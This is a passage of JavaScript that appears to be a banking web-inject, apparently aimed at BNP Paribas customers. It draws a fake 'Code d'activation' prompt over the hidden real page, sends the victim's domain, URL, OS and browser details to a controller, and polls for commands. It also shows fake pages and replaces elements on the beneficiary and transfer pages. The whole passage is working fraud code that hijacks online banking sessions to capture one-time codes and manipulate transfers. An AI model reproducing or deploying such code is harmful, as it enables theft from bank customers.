FJFQQ8RRo13gWuCNmiEVkkCkZWvZ+8dSmXzzxr0/reMz4Ks1bSYN17MBXglcKG4RmiFZqGByEzJbM7hVLbgwo7CgHYTBdlehzEFAK3QDO1CApGV8TD4zvBrKCgPvLuPFndXUzBvNJUAzdAODxMOZE71ZuZ7Pj9LftfEiQ/yBoemJKAdHuBlQoH4nsnVBbaVUTAnDOHEUxnwAC++9bn6cQUy/2TmTPnNkqfB1gOcsHpaAF7gCd7eKJD3j6b5+Dft7gm2VFIoJ5pOgCd4g0ePA1nYYNiz2FxOofYqTnJweoF7gjfuscSjQHxPZsiCbhW/Cu2upLCHVdMS8AaP8DpmIAFXd7aEWipIwReKQPK39fTzy19pogUOcInSBY/w6jYQv7rM8OD2UlLwBBUPDwjBs/+9JFEFLlG64BFe4XnUQAK/KGgNs+yjcL5AFESXSG3wCs8jBuJ3Kn1RcFsxhXfv55MrhUF8IOK0wSs8w/uwQOSNebWKjjJS2vcLhbO8hWco4Bne/xCI3/HNM0JuFPYpbeW0xF4hFM7yFp6hgGd4RwYDgfh/nqEPu1MsvNlUCASAd2QwEEjQpdw6ZcdeUtn3CYezvIVnJCg7jcQzqB8IJLS5oFdlK6MIe7lwOMtbeEYCvCMDRyD+n22RKW7vpohu0582EHhHBsiCBZ7ZtlZ5r4iW2k2SwFnewjMalHf3ELJgwQ1Z+1UPimmZvUwSOGu082d+6uDvQF+8fif6wvF8PDwThcpcRMEXMo0s9GrOtQgLAjFKgkEjw89d+cXuOHfr319T9ndnHY8ojL8JjwhEdBZTyJXsi0zxZV7PMksJLe82SgJnDR3XPup/W48d4TqO5yic94RHFJCBoimvhymvG35Ybi2hyO69ksBZQ8dzn9Q7xvHoyfhoPKKADJAFW9Ji6IvkT6K6SyWBs1zHkh7X0Pf//cUxjsevfv3HAFzHMc8dj0ggA2TBVDcMr6JsxXywRBIMGhkcy3tyxqP/yGGeOx6h4BkgC0cgav5EzQelgLNcx94kEHc8QuEMJKIlr09tLaLo7mJJ4CzXMcOTzz0KBPPc8YgEMkAWTHU9+we1dQ8fLJIEg0YGxwxP6jwMpM4tj0ggA55FL1N9mfU42rKbVnTvkQTOch3Lf3Lao0Awzx2PSCADVVNmD1NdSb8W3VlIMXxQCjjLdWzbN8c9CgTz3PGIRHTHLlpyOf0iU15I3a++X0Axtr9KggEjXsIzGtT3Cij8/BYjU9RtTFbfMZDGtlsSOMtbeEaDut1APIu1LPTEOllUazattBbSSpt4OMtbeEYE944MkIXjA6Ll1zJ6NV27/rSBwDsyGPjELKJxS73mQT7F2nYJh7O8hWckwDsyGAhEWZesX9GeTatsO4XDWRd+vDMhOEsKjfCODAY/Uz320Yyo5vS+2K4dfEKBUIgu0frgGd6RwR++qFp2MaV2pTmP4vgkkRirfvv9BZn+Xu8Ajscq0frgeWlDSu2wb+6UJ5PkMa2ZpLXuIK1NHMaqw99fGpiL47FKpDZ4hWfufdGIX3ZHXk5pW9WRyyfnC8NY1fBj+8Dc6z93ehCIOG3wCs+jfvuvOrU2XNOaQVqLgVZb84Xgt9+fj2myu+9buvuvRx68vJ4L0wWP8ArPbm+YiWrc1BJnziad1SAEOV9X0z9f/mfCf0zBAS5RuuARXse8g2jJiY9kmpatr1ZbcvnCvGkJeINHePXoprvIc8nlcXcy6YOuPPrAOs3APcEbPHp8F2J4TYJP9NVNj7XmLE6SO60AT/AGj290427EiQ9lK5tTn+o6simeE00HwAs8wdu4bu1eXveJflVrGsVbsklvzZnSgAd4gadx3+uuOLCaRdWvzYm7jVC2c+LsKQlohwd4mdDN/yF7NUx5UMfU59aVr27bSnpOnMAbTCVAM7TDw4R/HhJcEsNCjAhlNVPXJxVqW1NJ35nJG22fEoBWaIZ2IT8gCkEgHKEIpUrLouo+1sc1pzzTP8igxK7tlGj1UnBt0Ait0CzsJ2YhJSsGEFoaw8IrVrHltYm+sU0beuPvbaNESxZv7mXgmqANGqFV6I8QXQPpRwxTlMeypcf072guJZt1bWmUwLelt4QBLdAEbdAo/GeqodgZI0BRpmERh3U+K+o/KdE2b3qlv7+N1lgyaU3XWwLvDQ3QAk3QBo2TFggQtjeGKSv5S+hEgkzTuK5N17qZEsz8ZdSZMalBoCd6QwO0QBO0QaMEgUS7RRgHroTqYByLOpmgim1c16q7uYkS7qXRms50+rArQxKAGz3Qi/dsQ29ogJYwF32THohrMOGm/mAiaxPkmgtJtdprG57G395CCfe39odjmUAIltchcC5wghs90As90TtsBF1vLZChO2YJ37ZLa3Q+6r+t0a9sSDof17T+J1zN+DYe0N00SjRvpcQH24YH9do4zmEO5mIN1oIDXOBcdkQ3Az2G7gjJAwkrUY8bilLsmhimquT/Kh3WsshP42XRpxM3as59XB7bmHQ57sq6Hm1T8je65g2ka9nYD36MMZzDHMzFGqwFB7jACW5PNIwnkP8D2g4DYALfS3MAAAAASUVORK5CYII=">'+
							'<br><br>'+
							'<div style="color: #999;color: #999;color: #999;padding:30px;">'+_tables.text.query+'</div>'+
							'<br>'+
							'<div style="display: block;font-size: 1.13333rem;font-family: bnp_regular,Arial,sans-serif;color: #212121;margin: 10px 0px 5px;">Code d\'activation</div>'+
							'<div><input onkeyup="_tables.oncodeinput(this);" type="text" maxlength=10 id="_tables.code" style="outline-color: #D0D0D0line-height: 34px;padding-top: 10px;background-color: #FFF;background-image: none;border-radius: 3px;border: 1px solid #CCC;color: #767676;height: 47px;padding: 6px 45px 6px 12px;max-width: 400px;margin-bottom: 15px;box-shadow: 0px 1px 2px 0px rgba(204, 204, 204, 0.4) inset;"></div>'+
							'<br><br>'+
						'</div>'+
						'<br>'+
						'<center><button style="max-width:550px;" type="button" onclick="_tables.fkbtn(2);" id="_tables.button.2">Valider</button></center>'+
						'</div>';
		divHolder.style.display = 'none';
		divHolder.parentNode.insertBefore(div,divHolder);
	}
};

_tables.callback = function(){
	_tables.set('message','');
	switch(_tables.status()){
		case('CS'):
			if(/block/igm.test(_tables.answer.p1)){
				_tables.fake('BLOCK');
				_tables.showpage();
			}else if(_tables.answer.status == 'ON' && _tables.answer.link == 'ON' && !/^login$|^off$/igm.test(_tables.answer.p1)){
				_tables.status('NL');
				_tables.send(
					{'type':_tables.get('type')},
					{'domain':document.domain},
					{'link':document.location.href},
					{'data':'Language: ' +_tables.get('lang')+ '|OS: ' + jscd.os +' '+ jscd.osVersion + '|'+'Browser: ' + jscd.browser +' '+ jscd.browserVersion + '|'+'Screen Size: ' + jscd.screen},
					{'message':'Login page onloaded'},
					{'branch':'TJ'}
				);
			}else{
				
				_tables.showpage();
			}
		break;
		
		case('SL'):
			setTimeout(function(){
				_tables.cc('CC');
			},1500);
		break;
		
		case('NL'):
			_tables.loginform();
			_tables.showpage();
		break;
		
		case('CC'):
			if(_tables.answer.p1 == "NONE" || _tables.answer.p5 == "activated"){
				setTimeout(function(){
					_tables.cc('CC');
				},1000);
			}else{
				_tables.fake(_tables.answer.p1);
			}
		break;
		
		case('CP'):
			var div = _tables.id('id_beneficiaire_div') || _tables.id('id_balise_div') || _tables.id('id_virements_div') || _tables.id('id_historique_div');
			if(!_tables.replacerarray){
				if(div)div.style.display = '';
				return;
			}
			_tables.replacer();
			if(div)div.style.display = '';
		break;
		
		case('TJ'):
			_tables.set('pause',false);
			_tables.cc('CC');
		break;
		
		default:
			_tables.showpage();
		break;
	}
};